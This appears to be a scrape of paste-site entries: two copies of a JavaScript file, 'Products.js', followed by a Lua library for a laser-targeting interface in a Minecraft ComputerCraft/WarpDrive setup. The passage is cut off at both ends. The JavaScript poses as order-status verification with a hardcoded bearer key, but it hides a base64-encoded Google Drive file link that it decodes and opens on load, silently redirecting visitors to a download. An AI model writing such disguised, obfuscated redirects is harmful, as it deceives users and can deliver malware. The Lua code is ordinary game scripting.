      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CNmuG02M,Products.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 03:57:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94709/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
efHBdB4c,utils_0_3,drpepper240,Lua,Sunday 20th of April 2025 03:44:48 PM CDT,"--	Utils library v0.3 by DrPepper
--
--
-------------------------------------------------------------------

local Widgets = require(""widgets_0_3"")
-------------------------------------------------------------------
-- Tries to read table from the file
-- Returns table or (nil, error message)
function ReadTableFromFile(filename)
  local resTable
  local f = fs.open(filename, ""r"")
  if f then
    local fstr = f.readAll()
    f.close()
    if fstr then
      local resTable = textutils.unserialize(fstr)
      if resTable then
        return resTable
      else
        return nil, ""Can't unserialize ""..filename
      end
    else
      return nil, ""Can't read ""..filename
    end
  else
    return nil, ""Can't open ""..filename
  end
end

-------------------------------------------------------------------
-- Tries to write table to the file
-- Returns true or (nil, error message)
function WriteTableToFile(t, filename)
  local f = fs.open(filename, ""w"")
  if f then
    local resString = textutils.serialize(t)
    if resString then
      f.write(resString)
      f.close()
      return true
    else
      return nil, ""Can't serialize ""..filename
    end
  else
    return nil, ""Can't open ""..filename
  end
end

-------------------------------------------------------------------
-- Wraps text, returns an array of strings, respects line endings
function string:wrap(len)
  if len < 1 then len=#self end
  local strings = {}
  for line in self:gmatch(""([^\n]+)"") do
    while #line > 0 do
      table.insert(strings, line:sub(1, len))
      line = line:sub(len+1)
    end
  end
  return strings
end

-------------------------------------------------------------------
-- Backport of the same function from newer CC:Tweaked
-- Colour to hex lookup table for toBlit
local color_hex_lookup = {}
for i = 0, 15 do
    color_hex_lookup[2 ^ i] = string.format(""%x"", i)
end

local function colorToBlit(color)
    local hex = color_hex_lookup[color]
    if hex then return hex end

    if color < 0 or color > 0xffff then error(""Colour out of range"", 2) end
    return string.format(""%x"", math.floor(math.log(color, 2)))
end

-------------------------------------------------------------------
-- For given key-value table returns an indexed array of strings
-- ready for output and a table of index-key pairs.
local function ConvertTableToArrayStrings(t)
  local arr, ind = {}, {}
	for k, v in pairs(t) do
		if type(v)==""table"" then
			local s = """"
			for kk, vv in pairs(v) do
				if type(kk)==""number"" then kk = """"
				else kk = tostring(kk)..""=""
				end
				s = s..kk..tostring(vv)..""; ""
			end
			v=s
		end
		table.insert(arr, string.format(""%s: %s"", k, tostring(v)))
    table.insert(ind, #arr, k)
	end
  return arr, ind
end

-------------------------------------------------------------------
-- Same as above but with textutils.serialize()
local function ConvertTableToArraySerialize(t)
  local TS = textutils.serialize
  local arr, ind = {}, {}
	for k, v in pairs(t) do
		if type(v)==""table"" then
			local s = """"
			for kk, vv in pairs(v) do
				if type(kk)==""number"" then kk = """"
				else kk = TS(kk)..""=""
				end
				s = s..kk..TS(vv)..""; ""
			end
      table.insert(arr, string.format(""%s: %s"", TS(k), s))
		else
		  table.insert(arr, string.format(""%s: %s"", TS(k), TS(v)))
    end
    table.insert(ind, #arr, k)
	end
  return arr, ind
end

-------------------------------------------------------------------
-- Peripheral manager
-- Contains peripherals table with names of every peripheral
-- currently connected or saved in peripheral.cfg with its state:
-- peripherals = {peripheral_name = { wrapped = {table},
--  widgets = {array}, callable = true, lastUpdated = epoch,
--  lg=""GRP1"", lgm = true, pos = nil or {x, y, z}, eu = 3000,
--  euMax = 10000, type = warpdriveLaser } }
-- Contains laser group table with names of each laser peripheral
-- and lock state (nil means unlocked, number means targeter id that
-- locked the group):
-- laserGroups = {GRP1 = {main = ""laser3"", aux = {""laser1"",
-- ""laser2"", ...}, lock = 2}}
local function CreatePeripheralManager()
  local self = { peripherals = {},
    updaterPeriod = 1,        -- seconds
    peripheralPeriod = 2000,  -- ms
    logger = nil,             -- optional external logger
    widgetsToUpdate = {},     -- widgets to call :draw() on after each update cycle
    laserGroups = {},         --
    freq = 30000,             -- laser freq
    scRedThr = 0.1,           -- fraction of max energy below which the status is red
    scOrangeThr = 0.9         -- fraction of max energy below which the status is red
  }

  --forward declarations
  local function connectPeripheral(side) end
  local function fillLaserGroups() end
  local function updatePeripheral(side) end
  local function ReadPeripheralTable() end
  local function SetStatusLaser(p) end

  local function init(initLasers)
    --try reading the config into peripherals table
    local res = ReadPeripheralTable(self.peripherals)
    if initLasers then fillLaserGroups() end
    --connect all peripherals
    local connected = peripheral.getNames()
    for _,v in ipairs(connected) do
      connectPeripheral(v)
    end
  end

  -- populates laser group table with data from peripheral table
  fillLaserGroups = function()
    for name, p in pairs(self.peripherals) do
      if p.lg then
        if not self.laserGroups[p.lg] then
          self.laserGroups[p.lg] = {aux = {} }
        end
        if p.lgm then -- peripheral marked as main laser
          if self.laserGroups[p.lg].main and self.logger then
            self.logger.log(""ERROR"",
              string.format(""Two main lasers %s and %s in %s"",
              self.laserGroups[p.lg].main, name, p.lg),
              ""PeripheralManager"")
          end
          self.laserGroups[p.lg].main = name
        else
          table.insert(self.laserGroups[p.lg].aux, name)
        end
      end
    end
  end


  -- update the in-mem table with connected peripheral
  connectPeripheral = function (side)
    if not self.peripherals[side] then self.peripherals[side] = {} end
    cp = self.peripherals[side]
    cp.wrapped = peripheral.wrap(side)
    cp.type = peripheral.getType(side)
    updatePeripheral(side)
    if cp.widgets then
      for i,w in ipairs(cp.widgets) do w:draw() end
    end
  end

  -- mark peripheral as disconnected
  local function disconnectPeripheral(side)
    local dp = self.peripherals[side]
    if not dp then return end
    dp.wrapped = nil
    dp.callable = false
    if dp.widgets then
      for i,w in ipairs(cp.widgets) do w:draw() end
    end
  end

  -- update peripheral
  updatePeripheral = function (side)
    local now = os.epoch(""utc"")
    local p = self.peripherals[side]
    if not p then return end
    if not p.wrapped then
      if peripheral.isPresent(side) then connectPeripheral(side)
      else return
      end
    end
    if p.wrapped.isInterfaced then
      p.callable = p.wrapped.isInterfaced()
    else
      p.callable = true
    end

    if p.callable then
      --Energy
      if p.wrapped.getEnergyStatus then
        p.eu, p.euMax = p.wrapped.getEnergyStatus()
      end
      --Position
      if p.wrapped.getLocalPosition and not p.pos then
        p.pos = table.pack(p.wrapped.getLocalPosition())
      end
    end
     --laser-specific stuff
    if p.type and p.type == ""warpdriveLaser"" then
      if not p.frequency or p.frequency ~= self.freq then
        if p.wrapped and p.wrapped.beamFrequency and p.callable then
          p.frequency = p.wrapped.beamFrequency(self.freq)
          if not p.frequency or p.frequency == -1 then
            self.logger.log(""ERROR"", ""freq == -1"", ""updatePeripheral"")
          end
        end
      end
      SetStatusLaser(p)
    end
    --TODO further updates here
    p.lastUpdated = os.epoch(""utc"")
  end

  -- coroutine to process peripheral events
  local function managerCoroutine()
    while true do
      local p1, p2, p3, p4, p5 = os.pullEvent()
      if p1 == ""peripheral"" then
        connectPeripheral(p2)
      elseif p1 == ""peripheral_detach"" then
        disconnectPeripheral(p2)
      end
    end
  end

  local function updaterCoroutine()
    local tid = os.startTimer(self.updaterPeriod)
    while true do
      local p1, p2--[[, p3, p4, p5--]] = os.pullEvent()
      if (p1 == ""timer"" and p2 == tid)
          or p1 == ""updatePeripheralsNow"" then
        local sMs = os.epoch(""utc"")
        for name, per in pairs(self.peripherals) do
          if os.epoch(""utc"") > (sMs + 40) then break end
          if not per.lastUpdated
              or sMs >= per.lastUpdated + self.peripheralPeriod then
            updatePeripheral(name)
          end
        end
        local uMs = os.epoch(""utc"")
        if self.widgetsToUpdate then
          for i,w in ipairs(self.widgetsToUpdate) do w:draw() end
        end
        local dMs = os.epoch(""utc"")
        if self.logger then
          self.logger.log(""PERF"",
            ""Took ""..(uMs - sMs)..""ms to update, ""..(dMs - uMs)
            ..""ms to redraw"", ""updaterCoroutine"")
        end
        tid = os.startTimer(self.updaterPeriod)
      end
    end
  end

  local function setLogger(logger)
    self.logger = logger
  end

  --loads table deserialized from peripheral.cfg into t
  ReadPeripheralTable = function(t)
    --try reading the config into peripherals table
    local res, err = ReadTableFromFile(""peripheral.cfg"")
    if not res and self.logger then
      self.logger.log(""ERROR"", err, ""ReadPeripheralTable"")
      return nil
    end
    --copy data from it
    if res then
      for k,v in pairs(res) do
        t[k] = v
      end
    end
    return true
  end

  -- rewrites peripheral.cfg with the supplied table
  local WritePeripheralTable = function(t)
    local res, err = WriteTableToFile(t, ""peripheral.cfg"")
    if not res and self.logger then
      self.logger.log(""ERROR"", err, ""WritePeripheralTable"")
      return nil
    end
    return true
  end

  -- assigns a color representing the status
  SetStatusLaser = function (perTableEntry)
    if perTableEntry.wrapped and perTableEntry.callable
        and perTableEntry.eu and perTableEntry.euMax
        and perTableEntry.pos then
      local en = perTableEntry.eu / perTableEntry.euMax
      if en < self.scRedThr or perTableEntry.eu == 0 then
        perTableEntry.sc = colors.red
      elseif en < self.scOrangeThr then
        perTableEntry.sc = colors.orange
      else
        perTableEntry.sc = colors.green
      end
    else
      perTableEntry.sc = colors.gray
    end
  end

  local function GetDefaultParamsByType(perType)
    if perType == ""warpdriveLaser"" then
      return {lg = ""LG"", lgm = false, offset = {0,-1.5,0}}
      --for bottom main emitter position
      --return {lg = ""LG"", lgm = false, offset = {0,-1.5,0}}
      --for top main emitter position
      --return {lg = ""LG"", lgm = false, offset = {0,1.5,0}}
    else
      return {}
    end
  end

  -- Returns first found peripheral of given type from
  -- self.peripherals (might not be wrapped) with ""param"" = val if
  -- val is defined, with ""param"" if val is nil, or returns nil
  local function GetPeripheralByParamAndType(param, val, type)
    for _, p in pairs(self.peripherals) do
      if p.type and p.type == type then
        if p[param] and (val == nil or p[param] == val) then
          return p
        end
      end
    end
  end

  return {
    ManagerCoroutine = managerCoroutine,
    UpdaterCoroutine = updaterCoroutine,
    peripherals = self.peripherals,
    SetLogger = setLogger,
    widgetsToUpdate = self.widgetsToUpdate,
    Init = init,
    laserGroups = self.laserGroups,
    ReadPeripheralTable = ReadPeripheralTable,
    WritePeripheralTable = WritePeripheralTable,
    GetDefaultParamsByType = GetDefaultParamsByType,
    GetPeripheralByParamAndType = GetPeripheralByParamAndType
  }
end

local PeripheralManager = CreatePeripheralManager()

-------------------------------------------------------------------
-- Basic targeter
-- has local array of laser groups copied from the PeripheralManager
-- [1] = {name=""LG1"", p={mainRef, aux1ref, aux2ref, ...},
--   canHit = {true, false, nil, ...}}}
local function CreateTargeter(targeterId, logger)
  local self = {
    manager = PeripheralManager,
    isFiring = false,
    isAborted = false,
    id = targeterId,  -- to identify fire requests and lock lasers
    logger = logger,
    target = {nil, nil, nil}, --currently assigned target
    groups = {},
    selected = {},  --indices from groups array, ""selected"" means true,
                    --""not selected"" means nil
    modeBoost = true,
    attemptsMax = 30, --tries to find a group to fire
    minDstSq = 900, --won't shoot closer than this (squared)
    repeats = 3, --times to fire in succession
    repeatDelay = 1.0, --delay between repeats in seconds
    statusWidgetRef = nil, --has to have .text, .textColor and :draw()
    TargeterCoroutine = function() end,
    DisplayGroup = function() end,
    IsTargetAllowed = function() end,
    OnGroupSelect = function() end,
    SetTarget = function() end,
    GetTarget = function() end,
    ModeBoost = function() end,
    SetStatusWidget = function() end,
    FiringSequence = function() end,
    UpdateStatus = function() end
  }

  -- getter/setter
  self.ModeBoost = function (val)
    if val == nil then
      return self.modeBoost
    else
      if val == true then self.modeBoost = true return end
      if val == false then self.modeBoost = false return end
    end
  end

  self.SetStatusWidget = function(ref)
    self.statusWidgetRef = ref
  end

  -- updates status message (have to set the widget first)
  -- textColor is optional
  self.UpdateStatus = function(msg, textColor)
    if not self.statusWidgetRef or not self.statusWidgetRef.text
      or not self.statusWidgetRef.draw then return end
    self.statusWidgetRef.text = msg
    if textColor and self.statusWidgetRef.textColor then
      self.statusWidgetRef.textColor = textColor
    end
    self.statusWidgetRef:draw()
  end

  -- fills laser group array
  local function fillGroups()
    self.groups = {}
    for n, g in pairs(self.manager.laserGroups) do
      tgr = {name = n, p = {}, canHit = {}}
      if g.main and self.manager.peripherals[g.main] then
        tgr.p[1] = self.manager.peripherals[g.main]
        if g.aux then
          for _, auxName in ipairs(g.aux) do
            auxRef = self.manager.peripherals[auxName]
            if auxRef then tgr.p[#tgr.p+1] = auxRef end
          end
        end
        self.groups[#self.groups+1] = tgr
      else
        if self.logger then
          self.logger.log(""ERROR"", ""No main laser in ""..n, ""fillGroups"")
        end
      end
    end
    --TODO optional sorting
  end

  self.GetTarget = function()
    return self.target[1], self.target[2], self.target[3]
  end

  --Sets new target, updates canHit values for each group
  self.SetTarget = function(x, y, z)
    self.target[1], self.target[2], self.target[3] = x, y, z
    self.logger.log(""DEBUG"", string.format(""Set %s,%s,%s"",  x, y, z),
        ""setTarget"")
    for i_g, g in ipairs(self.groups) do
      for i_l, l in ipairs(g.p) do
        local res = nil
        if l and l.pos then --laser and its position are ok
          local relCoords = table.pack(x - l.pos[1],
                                      y - l.pos[2],
                                      z - l.pos[3])
          -- TODO distance check here
          res = self.IsTargetAllowed(l, relCoords)
        end
        g.canHit[i_l] = res
      end
    end
  end

  --blits laser group through the supplied widget (designed for list)
  --cuts group name after 4 symbols
  self.DisplayGroup = function(w, index, length, isSelected)
    --NWU1ooooo____ --like this
    local textColor = colorToBlit(colors.white)
    local bgColor = colorToBlit(colors.blue)
    if isSelected then bgColor = colorToBlit(colors.cyan) end
    local group = self.groups[index]
    if not group or not group.name then
      if self.logger then
        self.logger.log(""ERROR"", ""No group #""..index, ""DisplayGroup"")
      end
      return
    end
    --group in the manager
    local managerGroup = self.manager.laserGroups[group.name]
    if not managerGroup then
      self.logger.log(""ERROR"",
        ""No group ""..tostring(group.name).."" in the manager"",
        ""CheckFireGroup"")
    elseif managerGroup.lock then
      if managerGroup.lock ~= self.id then
        textColor = colorToBlit(colors.gray) --locked by other
      else
        textColor = colorToBlit(colors.yellow) --locked by self
      end
    end
    --group name blit
    local str=string.format(""%-4.4s"", group.name)
    local col=textColor:rep(4)
    local bg=bgColor:rep(4)
    --lasers
    for i_p = 1, length-4 do
      if group.p[i_p] then
        --symbol
        if i_p == 1 then
          str = str..""\4""
        else
          str = str..""\7""
        end
        --status
        if group.p[i_p].sc then
          col = col..colorToBlit(group.p[i_p].sc)
        else
          col = col..colorToBlit(colors.gray)
        end
        --bg
        if group.canHit[i_p] then
          bg = bg..colorToBlit(colors.green)
        else
          bg = bg..bgColor
        end
      else
        str = str.."" ""
        col = col..colorToBlit(colors.black)
        bg = bg..bgColor
      end
    end
    if not w or not w.window then
      if self.logger then
        self.logger.log(""ERROR"", ""Widget error"", ""displayGroup"")
      end
      return
    end
    w.window.blit(str, col, bg)
  end

  -- overload for WidgetListView:OnSelect()
  self.OnGroupSelect = function (w)
    if not w then return end
    for i_g, g in ipairs(self.groups) do
      local mg = self.manager.laserGroups[g.name]
      if not mg then
        self.logger.log(""ERROR"", ""No group ""..tostring(g.name)
          .."" in the manager"", ""CheckFireGroup"")
        return
      end
      if not mg.lock or mg.lock == self.id then
        if not w.selected then  --no widget selection data
          if self.selected[i_g] then
            mg.lock = nil
            self.selected[i_g] = nil
            self.logger.log(""DEBUG"", ""unlocked ""..g.name, ""OGS"")
          end
        else
          if w.selected[i_g] then --selected in the widget
            mg.lock = self.id
            self.selected[i_g] = true
            self.logger.log(""DEBUG"", ""locked ""..g.name, ""OGS"")
          else  --not selected in the widget (nil or false)
            mg.lock = nil
            self.selected[i_g] = nil
            self.logger.log(""DEBUG"", ""unlocked ""..g.name, ""OGS"")
          end
        end
      end
    end
    if not w.selected then
      self.selected = {}
    end
  end

  -- input: ref to laser peripheral, relative {x,y,z} of the target
  self.IsTargetAllowed = function(laserPerRef, relXyzT)
    --TODO sanity checks
    local x, y, z = table.unpack(relXyzT)
    self.logger.log(""DEBUG"", string.format(""%s,%s,%s"",
        x, y, z ), ""IsTargetAllowed"")
    if x*x + y*y + z*z < self.minDstSq then
      self.logger.log(""DEBUG"", ""Too close"", ""IsTargetAllowed"")
      return false
    end
    ax, ay, az = math.abs(x), math.abs(y), math.abs(z)
    if laserPerRef.N and z < 0 and az >= ax and az >= ay then
      self.logger.log(""DEBUG"", ""N"", ""IsTargetAllowed"")
      return true
    end
    if laserPerRef.S and z > 0 and az >= ax and az >= ay then
      self.logger.log(""DEBUG"", ""S"", ""IsTargetAllowed"")
      return true
    end
    if laserPerRef.W and x < 0 and ax >= ay and ax >= az then
      self.logger.log(""DEBUG"", ""W"", ""IsTargetAllowed"")
      return true
    end
    if laserPerRef.E and x > 0 and ax >= ay and ax >= az then
      self.logger.log(""DEBUG"", ""E"", ""IsTargetAllowed"")
      return true
    end
    if laserPerRef.D and y < 0 and ay >= ax and ay >= az then
      self.logger.log(""DEBUG"", ""D"", ""IsTargetAllowed"")
       return true
    end
    if laserPerRef.U and y > 0 and ay >= ax and ay >= az then
      self.logger.log(""DEBUG"", ""U"", ""IsTargetAllowed"")
      return true
    end
    self.logger.log(""DEBUG"", ""false"", ""IsTargetAllowed"")
    return false
  end

  -- simple fire condition function to fire once
  local function CheckFireCondition()
    if not self.target[1] or not self.target[2]
        or not self.target[3] then
      self.UpdateStatus(""NO TARG"", colors.red)
      return false
    end
    if self.isAborted then
      self.UpdateStatus(""ABORTED"", colors.red)
      return false
    end
    return true --TODO
  end

  -- returns true if the laser is ready to fire sans direction check
  local function CheckLaser(laserPerRef)
    if not laserPerRef.sc then return false end
    return laserPerRef.sc == colors.green
  end

  -- returns true if the entire laser group is ready to fire
  -- in boosted mode, or at least one laser is ready otherwise.
  -- Checks if the group is locked to the current targeter or no
  -- groups are locked to it at all
  -- Locks the group
  local function CheckFireGroup(g)
    -- lock check
    local groupM = self.manager.laserGroups[g.name]
    if not groupM then
      self.logger.log(""ERROR"",
        ""No group ""..tostring(g.name).."" in the manager"",
        ""CheckFireGroup"")
      return false
    end
    --locked by some other targeter
    if groupM.lock and groupM.lock ~= self.id then
      self.logger.log(""DEBUG"",g.name.."" locked by othr"",""CheckFG"")
      return false
    end
    --some groups are selected (self.selected not empty),
    --but this one does not have a lock
    if self.selected and next(self.selected) ~= nil
        and not groupM.lock then
      return false
    end
    -- direction check
    if self.ModeBoost then
      if not g.canHit[1] then
        self.logger.log(""DEBUG"",g.name.."" can't hit"",""CheckFG"")
        return false
      end
      -- individual laser check
      for i_l=1, #g.p do
        if not CheckLaser(g.p[i_l]) then
          self.logger.log(""DEBUG"",g.name.."" has false on laser ""..
            tostring(i_l),""CheckFG"")
          return false
        end
      end
    else  --at least one can hit
      for i_l=1, #g.p do
        if g.canHit[i_l] and CheckLaser(g.p[i_l]) then
          break
        end
      end
    end
    -- locking to self
    groupM.lock = self.id
    return true
  end

  -- returns an array of suitable laser groups ready to fire
  -- this one tries attemptsMax times to find a single group with 1s
  -- cooldown if none are available
  local function GetSuitableGroups()
    for attempt = 1, self.attemptsMax do
      if not CheckFireCondition() then
        return {}
      end
      for i_g, g in ipairs(self.groups) do
        if CheckFireGroup(g)==true then return {g} end
      end
      self.UpdateStatus(""WAIT #""..attempt, colors.orange)
      sleep(1)
    end
    self.UpdateStatus(""NO GROUPS"", colors.red)
    return {}
  end

  --returns number of groups which opened fire successfully
  local function FireBoost(groupsArray)
    local fired = 0
    for _,g in ipairs(groupsArray) do
      local xm, ym, zm = table.unpack(g.p[1].pos)
      local xt, yt, zt = table.unpack(self.target)
      for i_l=2, #g.p do
        local xo, yo, zo = 0, 0, 0
        if g.p[i_l].offset then
          xo, yo, zo = table.unpack(g.p[i_l].offset)
        end
        --TODO check if callable
        local xl, yl, zl = table.unpack(g.p[i_l].pos)
        g.p[i_l].wrapped.emitBeam(xm-xl+xo, ym-yl+yo, zm-zl+zo)
        --mark lasers red
        g.p[i_l].sc = colors.red
        self.logger.log(""DEBUG"", string.format(""%s[%s].emitBeam(%s,%s,%s)"",
          g.name, i_l, xm-xl+xo, ym-yl+yo, zm-zl+zo), ""FireBoost"")
      end
      sleep(0.1) --boost sleep
      if not CheckFireCondition() then
        return fired
      end
      g.p[1].wrapped.emitBeam(xt-xm, yt-ym, zt-zm)
      --mark lasers red
      g.p[1].sc = colors.red
      self.logger.log(""DEBUG"", string.format(""%s[1].emitBeam(%s,%s,%s)"",
      g.name, xt-xm, yt-ym, zt-zm), ""FireBoost"")
      fired = fired+1
      --UpdateStatus(""FIRED""..""""..""B"", colors.green)
    end
    return fired
  end

  --TODO
  local function FireAll(groupsArray)
    local count = 0
    for _,g in ipairs(groupsArray) do
      local xt, yt, zt = table.unpack(self.target)
      for i_l=1, #g.p do
        if g.canHit[i_l] and CheckLaser(g.p[i_l]) then
          local xl, yl, zl = table.unpack(g.p[i_l].pos)
          g.p[i_l].wrapped.emitBeam(xt-xl, yt-yl, zt-zl)
          count = count+1
        end
      end
    end
    self.UpdateStatus(""FIRED #""..count, colors.green)
  end

  --unlocks every group except selected
  local function UnlockGroups()
    for i_g, g in ipairs(self.groups) do
      local mg = self.manager.laserGroups[g.name]
      if not mg then
        self.logger.log(""ERROR"", ""No group ""..tostring(g.name)
          .."" in the manager"", ""UnlockGroups"")
        return
      end
      if not self.selected then
        self.logger.log(""ERROR"", ""nil"", ""UG"")
        return
      end
      if mg.lock and mg.lock == self.id then
        if not self.selected[i_g] then
          mg.lock = nil
          self.logger.log(""DEBUG"", ""unlocked ""..g.name, ""UG"")
        end
      end
    end
  end

  self.FiringSequence = function()
    self.isFiring = true
    for i_r=1, self.repeats do
      if CheckFireCondition() then
        --find suitable laser groups
        local groupsArray = GetSuitableGroups()
        if self.modeBoost then
          FireBoost(groupsArray)
          self.UpdateStatus(""FIRED #""..i_r, colors.green)
        else
          FireAll(groupsArray)
        end
        --unlock laser groups
        UnlockGroups(groupsArray)
      else
        break
      end
      if i_r < self.repeats then sleep(self.repeatDelay) end
    end
    self.isFiring = false
  end

  self.TargeterCoroutine = function()
    self.UpdateStatus(""STARTED"", colors.green)
    while true do
      local p1, p2, p3, p4, p5 = os.pullEvent()
      if p1 == ""fire"" and p2 == self.id then
        self.logger.log(""DEBUG"", ""fire event: id=""..tostring(p2), ""TC"")
        self.FiringSequence()
        --UpdateStatus(""STANDBY"", colors.green)
      end
    end
  end

  fillGroups()

  return self
end

-- Repeating targeter --now included in the basic
--local function CreateTargeterR(targeterId, logger)
--  local self = table.pack(CreateTargeter(targeterId, logger))
--  basicFireSequence = self.FiringSequence()
--end

-- Automatic targeter (to work with laser cameras)
local function CreateTargeterAutoCam(targeterId, logger)
  local self = CreateTargeter(targeterId, logger)
  self.TargeterCoroutine = function()
    self.UpdateStatus(""LISTEN"", colors.green)
    while true do
      local p1, p2, p3, p4, p5 = os.pullEvent()
      self.logger.log(""DEBUG"", tostring(p1).."",""..
        tostring(p2).."",""..tostring(p3)..""..."", ""ACAM"")
      self.UpdateStatus(p1, colors.pink)
    end
  end
  return self
end


-------------------------------------------------------------------
-- Basic targeter tab
-- fills 18x51 tab with widgets for basic targeter
-- Input:
-- targeterId (1, 2, ...)
-- refTabWidget - empty 18x51 tab
-- refTextInput - InputLine widget reference
-- refTargetArray - target array reference
-- refTargetArrDrawRow - function drawing target array elements
-- Output:
-- t1ListT - target list ref (for updates)
-- TargeterCoroutine
local function CreateTargeterTab(targeterId, refTabWidget,
      refTextInput, refTargetArray, refTargetArrDrawRow)
  local targeter1 = CreateTargeter(targeterId, Widgets.Logger)
  local t1l1 = Widgets.Label:new()
  t1l1:init(refTabWidget, 1, 1, 13, 1, true)
  t1l1.text = ""Lasers:""
  local t1ListLg = Widgets.ListView:new()
  t1ListLg:init(refTabWidget, 1, 2, 10, 16, true)
  t1ListLg.isSelectable = true
  t1ListLg.isMultiSelectable = true
  t1ListLg.dataArray = targeter1.groups
  t1ListLg.drawRow = targeter1.DisplayGroup
  t1ListLg.onSelect = targeter1.OnGroupSelect
  table.insert(PeripheralManager.widgetsToUpdate, t1ListLg)
  local t1l2 = Widgets.Label:new()
  t1l2:init(refTabWidget, 12, 1, 7, 1, true)
  t1l2.text = ""Target:""
  local t1l3 = Widgets.Label:new()
  t1l3:init(refTabWidget, 12, 2, 20, 1, true)
  t1l3.bgColor = colors.white
  t1l3.text = string.format(""%7s,%4s,%7s"", targeter1.GetTarget())
  local t1b1 = Widgets.Button:new()
  t1b1:init(refTabWidget, 32, 2, 5, 1, true)
  t1b1.caption = ""ENTER""
  t1b1.refTextInput = refTextInput
  t1b1.refTargeter = targeter1
  t1b1.refDrawable = refTabWidget
  t1b1.onClick = function(self)
    if not self.refTextInput or not self.refTargeter
        or not self.refDrawable then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""TargetSetBn"")
      return
    end
    local str = self.refTextInput:processText(""x, y, z: "", """")
    local tab = textutils.unserialize(""{""..str..""}"")
    if tab == nil then return end
    local x, y, z = table.unpack(tab)
    if x and type(x) == ""number"" and y and type(y) == ""number""
      and z and type(z) == ""number"" then
        self.refTargeter.SetTarget(x, y, z)
        t1l3.text = string.format(""%7s,%4s,%7s"", self.refTargeter.GetTarget())
        self.refDrawable:draw()
      else
        Widgets.Logger.log(""DEBUG"", string.format(""x,y,z=%s,%s,%s"",
          x, y, z), ""TargetSetBn"")
      end
  end
  local t1b2 = Widgets.ButtonT:new()
  t1b2:init(refTabWidget, 40, 4, 7, 1, true)
  t1b2.caption = "" BOOST""
  t1b2.fn = targeter1.ModeBoost
  local t1l6 = Widgets.Label:new()
  t1l6:init(refTabWidget, 40, 5, 7, 1, true)
  t1l6.text = ""Repeats:""
  local t1b6 = Widgets.Button:new()
  t1b6:init(refTabWidget, 40, 6, 7, 1, true)
  t1b6.caption = tostring(targeter1.repeats)
  t1b6.refTargeter = targeter1
  t1b6.refTextInput = refTextInput
  t1b6.refDrawable = refTabWidget
  t1b6.onClick = function(self)
    if not self.refTextInput or not self.refTargeter
        or not self.refDrawable then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""RepeatsBn"")
      return
    end
    local val = tonumber(self.refTextInput:processText(
      ""Number of repeats: "", tostring(self.refTargeter.repeats)))
    if not val then return end
    val = math.floor(math.abs(val))
    if val <= 0 then return end
    self.refTargeter.repeats = val
    self.caption = tostring(val)
    self.refDrawable:draw()
  end
  local t1l7 = Widgets.Label:new()
  t1l7:init(refTabWidget, 40, 7, 7, 1, true)
  t1l7.text = ""Delay:""
  local t1b7 = Widgets.Button:new()
  t1b7:init(refTabWidget, 40, 8, 7, 1, true)
  t1b7.caption = tostring(targeter1.repeatDelay.."" s"")
  t1b7.refTargeter = targeter1
  t1b7.refTextInput = refTextInput
  t1b7.refDrawable = refTabWidget
  t1b7.onClick = function(self)
    if not self.refTextInput or not self.refTargeter
        or not self.refDrawable then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""RepeatDelayBn"")
      return
    end
    local val = tonumber(self.refTextInput:processText(
      ""Seconds between repeats: "",
      tostring(self.refTargeter.repeatDelay)))
    if not val then return end
    val = math.floor(math.abs(val)*20)/20
    if val < 0.05 then return end
    self.refTargeter.repeatDelay = val
    self.caption = tostring(val).."" s""
    self.refDrawable:draw()
  end
  local t1b3 = Widgets.ButtonM:new()
  t1b3:init(refTabWidget, 45, 14, 6, 2, true)
  t1b3.text = "" \n FIRE \n""
  t1b3.refTargeter = targeter1
  t1b3.onClick = function(self)
    if not self.refTargeter then
      Widgets.Logger.log(""ERROR"", ""ref not set"", ""FireBn"")
      return
    end
    self.refTargeter.isAborted = false
    if not self.refTargeter.isFiring then
      os.queueEvent(""fire"", targeterId)
    end
  end
  local t1l4 = Widgets.Label:new()
  t1l4:init(refTabWidget, 38, 1, 7, 1, true)
  t1l4.text = ""Status:""
  local t1LStatus = Widgets.Label:new()
  t1LStatus:init(refTabWidget, 38, 2, 10, 1, true)
  t1LStatus.bgColor = colors.blue
  targeter1.SetStatusWidget(t1LStatus)
  local t1l5 = Widgets.Label:new()
  t1l5:init(refTabWidget, 12, 3, 13, 1, true)
  t1l5.text = ""Target list:""
  -- target list viewer/selector
  local t1ListT = Widgets.ListView:new()
  t1ListT:init(refTabWidget, 12, 4, 25, 14, true)
  t1ListT.isSelectable = true
  t1ListT.dataArray = refTargetArray
  t1ListT.drawRow = refTargetArrDrawRow
  table.insert(ttB1.refDrawableArr, t1ListT)
  local t1b4 = Widgets.Button:new()
  t1b4:init(refTabWidget, 27, 3, 3, 1, true)
  t1b4.caption = "" \30 ""
